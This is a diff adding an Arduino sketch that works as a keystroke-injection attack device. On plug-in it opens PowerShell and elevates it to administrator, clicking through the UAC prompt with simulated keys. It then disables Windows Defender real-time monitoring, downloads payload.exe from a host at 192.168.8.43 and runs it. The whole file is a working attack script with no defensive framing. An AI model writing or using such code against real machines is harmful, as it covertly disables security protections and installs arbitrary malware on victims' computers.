@@ -1,0 +1,105 @@
+#include <Keyboard.h> 
+/*
+ * Developers @cycus @Cyberwarrior @jonesjay
+ */
+
+// Init function
+void setup()
+{
+  // Begining the stream
+  Keyboard.begin();
+
+  // Waiting 500ms for init
+  delay(500);
+
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(114);
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  Keyboard.print("powershell");
+
+  delay(750);
+
+  typeKey(KEY_RETURN);
+
+  delay(700);
+
+  Keyboard.print("Start-Process powershell -Verb runAs");
+
+  delay(750);
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+  delay(1000);
+  Keyboard.press(KEY_LEFT_ARROW);
+  Keyboard.releaseAll();
+
+  delay(1000);
+
+  typeKey(KEY_RETURN);
+
+  delay(1500);
+
+  Keyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
+
+  delay(1500);
+
+  typeKey(KEY_RETURN);
+
+  delay(750);
+  
+  Keyboard.print("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");
+  
+  typeKey(KEY_RETURN);
+
+  delay(100);
+  
+  Keyboard.print("Invoke-WebRequest -OutFile payload.exe -Uri http://192.168.8.43/payload.exe");
+
+  delay(750);
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+
+  Keyboard.print("start-process payload.exe");
+
+  delay(2000);
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  Keyboard.print("exit");
+
+  delay(1000);
+
+  typeKey(KEY_RETURN);
+
+  delay(750);
+
+  Keyboard.print("exit");
+
+  delay(750);
+
+  typeKey(KEY_RETURN);
+
+  typeKey(KEY_RETURN);
+}
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+// Unused
+void loop() {}
